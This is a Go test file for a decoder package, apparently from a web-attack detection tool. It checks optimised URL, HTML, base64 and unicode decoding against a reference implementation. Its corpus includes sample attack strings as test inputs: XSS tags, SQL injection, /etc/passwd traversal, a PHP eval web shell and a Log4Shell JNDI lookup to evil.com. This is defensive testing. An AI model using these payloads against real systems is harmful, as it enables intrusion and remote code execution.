package decoder

import (
	"reflect"
	"strings"
	"testing"
)

// decoderCorpus spans every branch Decode/DecodeAll can take, plus the shapes
// the cheap pre-gates must not change: no-marker text, '%' without a valid hex
// pair, '+' alone, '&' without a real entity, and layered combinations.
var decoderCorpus = []string{
	"",
	" ",
	"plain text with no markers at all",
	"a+b",
	"100%",
	"100%zz",
	"%",
	"%2",
	"%41",
	"%41%42%43",
	"%25%32%35",
	"%%%%",
	"a&b",
	"&",
	"&amp;",
	"&lt;script&gt;alert(1)&lt;/script&gt;",
	"&#60;&#62;",
	"&#x3c;&#x3e;",
	"&notarealentity;",
	"1' UNION SELECT password--",
	"%27%20OR%201%3D1--",
	"%2527%2520OR%25201%253D1",
	"PCEtLSBiYXNlNjQgLS0+",
	"c2VsZWN0ICogZnJvbSB1c2Vycw==",
	"YWFhYWFhYWFhYWFhYWFhYWFhYWFhYWE=",
	`<script>alert(1)</script>`,
	`\x3cscript\x3e`,
	`ABCD`,
	"%3Cscript%3E&lt;b&gt;\\u0041",
	"../../../etc/passwd",
	"..%2f..%2f..%2fetc%2fpasswd",
	"<?php eval($_POST['cmd']); ?>",
	"${jndi:ldap://evil.com/a}",
	"a=1&b=2&c=3",
	"key=val+with+plus&other=%20space",
	strings.Repeat("A", 300),
	strings.Repeat("%41", 100),
	strings.Repeat("&amp;", 60),
	"日本語テキスト",
	"%E6%97%A5%E6%9C%AC%E8%AA%9E",
	"mixed 日本 %41 &amp; \\u0042 +plus",
}

// referenceDecode is the pre-optimization Decode, kept verbatim as the oracle.
// Any divergence between this and Decode is a behavioural regression.
func referenceDecode(raw string) Decoded {
	text := raw
	layers := []string{"raw"}
	for i := 0; i < 3; i++ {
		next, err := queryUnescapeReference(text)
		if err != nil || next == text {
			break
		}
		text = next
		layers = append(layers, "url")
	}
	if unescaped := htmlUnescapeReference(text); unescaped != text {
		text = unescaped
		layers = append(layers, "html")
	}
	if looksLikeEncodedPayload(text) {
		if b64, ok := TryBase64(strings.TrimSpace(text)); ok && printableRatio(b64) > 0.65 {
			text = b64
			layers = append(layers, "base64")
		}
	}
	if unescaped, changed := unescapeUnicode(text); changed {
		text = unescaped
		layers = append(layers, "unicode")
	}
	text = strings.TrimSpace(text)
	return Decoded{Raw: raw, Layers: layers, Text: text}
}

// referenceDecodeAll is the pre-optimization DecodeAll, kept verbatim.
func referenceDecodeAll(raw string) []Decoded {
	result := referenceDecode(raw)
	deep := referenceDeepDecode(raw)
	out := []Decoded{result}
	if deep.Text != result.Text {
		out = append(out, deep)
	}
	for _, encoding := range base64Encodings {
		decoded, err := encoding.DecodeString(strings.TrimSpace(deep.Text))
		if err == nil && len(decoded) > 0 && printableRatio(string(decoded)) > 0.7 {
			out = append(out, Decoded{Raw: deep.Text, Layers: append(deep.Layers, "base64"), Text: string(decoded)})
			break
		}
	}
	return out
}

func referenceDeepDecode(raw string) Decoded {
	result := referenceDecode(raw)
	if len(result.Layers) > 1 {
		second := referenceDecode(result.Text)
		if len(second.Layers) > 1 {
			result.Text = second.Text
			result.Layers = append(result.Layers, second.Layers[1:]...)
		}
	}
	return result
}

func TestDecodeMatchesReferenceAcrossCorpus(t *testing.T) {
	for _, raw := range decoderCorpus {
		got := Decode(raw)
		want := referenceDecode(raw)
		if got.Text != want.Text {
			t.Errorf("Decode(%q).Text = %q, reference = %q", raw, got.Text, want.Text)
		}
		if !reflect.DeepEqual(got.Layers, want.Layers) {
			t.Errorf("Decode(%q).Layers = %v, reference = %v", raw, got.Layers, want.Layers)
		}
		if got.Raw != want.Raw {
			t.Errorf("Decode(%q).Raw = %q, reference = %q", raw, got.Raw, want.Raw)
		}
	}
}

func TestDeepDecodeMatchesReferenceAcrossCorpus(t *testing.T) {
	for _, raw := range decoderCorpus {
		got := DeepDecode(raw)
		want := referenceDeepDecode(raw)
		if got.Text != want.Text {
			t.Errorf("DeepDecode(%q).Text = %q, reference = %q", raw, got.Text, want.Text)
		}
		if !reflect.DeepEqual(got.Layers, want.Layers) {
			t.Errorf("DeepDecode(%q).Layers = %v, reference = %v", raw, got.Layers, want.Layers)
		}
	}
}

func TestDecodeAllMatchesReferenceAcrossCorpus(t *testing.T) {
	for _, raw := range decoderCorpus {
		got := DecodeAll(raw)
		want := referenceDecodeAll(raw)
		if len(got) != len(want) {
			t.Fatalf("DecodeAll(%q) returned %d variants, reference returned %d", raw, len(got), len(want))
		}
		for i := range got {
			if got[i].Text != want[i].Text {
				t.Errorf("DecodeAll(%q)[%d].Text = %q, reference = %q", raw, i, got[i].Text, want[i].Text)
			}
			if !reflect.DeepEqual(got[i].Layers, want[i].Layers) {
				t.Errorf("DecodeAll(%q)[%d].Layers = %v, reference = %v", raw, i, got[i].Layers, want[i].Layers)
			}
			if got[i].Raw != want[i].Raw {
				t.Errorf("DecodeAll(%q)[%d].Raw = %q, reference = %q", raw, i, got[i].Raw, want[i].Raw)
			}
		}
	}
}

// TestUnescapeGatesAreExact pins the reasoning behind the cheap pre-gates:
// QueryUnescape can only alter text containing '%' or '+', and HTML unescaping
// can only alter text containing '&'. If either ever stops holding, the gates in
// Decode become unsound and these cases fail here rather than in production.
func TestUnescapeGatesAreExact(t *testing.T) {
	for _, raw := range decoderCorpus {
		if !strings.ContainsAny(raw, "%+") {
			got, err := queryUnescapeReference(raw)
			if err != nil || got != raw {
				t.Errorf("QueryUnescape(%q) = (%q, %v); gate assumed it is a no-op without %% or +", raw, got, err)
			}
		}
		if !strings.Contains(raw, "&") {
			if got := htmlUnescapeReference(raw); got != raw {
				t.Errorf("UnescapeString(%q) = %q; gate assumed it is a no-op without &", raw, got)
			}
		}
	}
}

func BenchmarkDecodeCleanText(b *testing.B) {
	raw := "/api/v1/users?page=2&sort=name"
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		_ = Decode(raw)
	}
}

func BenchmarkDecodeEncodedPayload(b *testing.B) {
	raw := "%27%20OR%201%3D1--%20&lt;script&gt;"
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		_ = Decode(raw)
	}
}

func BenchmarkDecodeAllCleanText(b *testing.B) {
	raw := "/api/v1/users?page=2&sort=name"
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		_ = DecodeAll(raw)
	}
}

func BenchmarkDecodeAllEncodedPayload(b *testing.B) {
	raw := "%2527%2520OR%25201%253D1%20--"
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		_ = DecodeAll(raw)
	}
}
